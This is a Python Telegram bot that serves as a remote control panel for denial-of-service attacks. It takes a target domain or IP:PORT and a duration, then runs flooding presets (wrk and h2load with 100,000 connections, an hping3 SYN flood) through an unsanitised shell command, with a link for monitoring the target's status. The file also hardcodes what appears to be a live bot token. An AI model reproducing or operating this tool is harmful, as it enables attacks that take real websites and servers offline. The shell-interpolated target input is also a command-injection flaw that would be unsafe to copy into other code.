#!/usr/bin/env python3
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
)
import subprocess, os, signal, time, threading

# ================= CONFIG =================
TOKEN = "8511925925:AAGRxxH2-ZU0EciOezMA3ToEi2UxtUrIAW0"
AUTHORIZED_ID = 5699538596
MAX_DURATION = 600
# =========================================

process = None
running = False

(
    CHOOSE_MODE,
    CHOOSE_PRESET,
    INPUT_TARGET,
    INPUT_DURATION
) = range(4)

# ---------- Presets ----------
L7_PRESETS = {
    "Basic": {"bin": "wrk", "flags": "-t30 -c100000 -d10m"},
    "Aggressive": {"bin": "h2load", "flags": "-n 10000 -c 100000 -t 30"}
}

L4_PRESETS = {
    "Default": {"cmd": "hping3", "args": "-S -p {port} -d 9999 --flood"},
    "Fast": {"cmd": "tx_program", "args": "-p {port} -d 30 -t 600"}
}

# ---------- UI helpers ----------
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟦 L7", callback_data="MODE:L7"),
         InlineKeyboardButton("🟥 L4", callback_data="MODE:L4")],
        [InlineKeyboardButton("📡 Monitor", url="https://check-host.net")]
    ])

def preset_menu(presets):
    return InlineKeyboardMarkup([[InlineKeyboardButton(name, callback_data=f"PRESET:{name}")] for name in presets])

def stop_menu():
    return InlineKeyboardMarkup([[InlineKeyboardButton("⛔ STOP", callback_data="STOP")]])

def progress_bar(progress, size=20):
    filled = int(size * progress)
    return "🟪" * filled + "⬛" * (size - filled)

# ---------- /start ----------
def start(update: Update, context: CallbackContext):
    if update.effective_user.id != AUTHORIZED_ID:
        return
    update.message.reply_text(
        "🚀 Seleziona modalità",
        reply_markup=main_menu()
    )
    return CHOOSE_MODE

# ---------- MODE ----------
def choose_mode(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    mode = query.data.split(":")[1]
    context.user_data.clear()
    context.user_data["mode"] = mode
    presets = L7_PRESETS if mode == "L7" else L4_PRESETS
    query.edit_message_text(
        f"⚙️ {mode} • Seleziona preset",
        reply_markup=preset_menu(presets)
    )
    return CHOOSE_PRESET

# ---------- PRESET ----------
def choose_preset(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    preset_name = query.data.split(":")[1]
    context.user_data["preset"] = preset_name
    query.edit_message_text(
        "🎯 Invia target\n"
        "• L7 → dominio / URL\n"
        "• L4 → IP:PORT"
    )
    return INPUT_TARGET

# ---------- TARGET ----------
def input_target(update: Update, context: CallbackContext):
    context.user_data["target"] = update.message.text.strip()
    update.message.reply_text(f"⏱ Durata in secondi (max {MAX_DURATION}):")
    return INPUT_DURATION

# ---------- DURATION ----------
def input_duration(update: Update, context: CallbackContext):
    global process, running
    try:
        duration = int(update.message.text.strip())
        if duration < 1 or duration > MAX_DURATION:
            update.message.reply_text(f"Numero non valido o maggiore di {MAX_DURATION}")
            return INPUT_DURATION
    except:
        return INPUT_DURATION

    mode = context.user_data["mode"]
    preset_name = context.user_data["preset"]
    target = context.user_data["target"]

    if mode == "L7":
        preset = L7_PRESETS[preset_name]
        cmd = f"{preset['bin']} {preset['flags']} {target}"
        label = preset_name
    else:
        if ":" not in target:
            update.message.reply_text("Formato IP:PORT errato", reply_markup=main_menu())
            return ConversationHandler.END
        ip, port = target.split(":", 1)
        preset = L4_PRESETS[preset_name]
        cmd = f"{preset['cmd']} {preset['args'].format(port=port)} {ip}"
        label = preset_name

    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )
    running = True
    msg = update.message.reply_text(
        "⏳ Avvio…",
        reply_markup=stop_menu()
    )
    threading.Thread(target=animate, args=(context, msg.chat_id, msg.message_id, duration, label), daemon=True).start()
    return ConversationHandler.END

# ---------- ANIMATE ----------
def animate(context: CallbackContext, chat_id, msg_id, duration, label):
    global running, process
    start_time = time.time()
    while running:
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
        progress = min(elapsed / duration, 1)
        percent = int(progress * 100)
        text = (
            f"🚀 {label}\n\n"
            f"⏳ [{progress_bar(progress)}] {percent}%\n"
            f"⏱ {int(duration - elapsed)}s"
        )
        context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, reply_markup=stop_menu())
        time.sleep(0.5)  # aggiornamento più fluido
    # Fine
    if process and process.poll() is None:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    running = False
    process = None
    context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="✅ Completato", reply_markup=main_menu())

# ---------- STOP ----------
def stop(update: Update, context: CallbackContext):
    global running, process
    query = update.callback_query
    query.answer()
    if process and process.poll() is None:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    running = False
    process = None
    query.edit_message_text("⛔ Fermato", reply_markup=main_menu())

# ---------- MAIN ----------
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_MODE: [CallbackQueryHandler(choose_mode, pattern="^MODE:")],
            CHOOSE_PRESET: [CallbackQueryHandler(choose_preset, pattern="^PRESET:")],
            INPUT_TARGET: [MessageHandler(Filters.text & ~Filters.command, input_target)],
            INPUT_DURATION: [MessageHandler(Filters.text & ~Filters.command, input_duration)],
        },
        fallbacks=[CallbackQueryHandler(stop, pattern="^STOP$")],
    )

    dp.add_handler(conv)
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
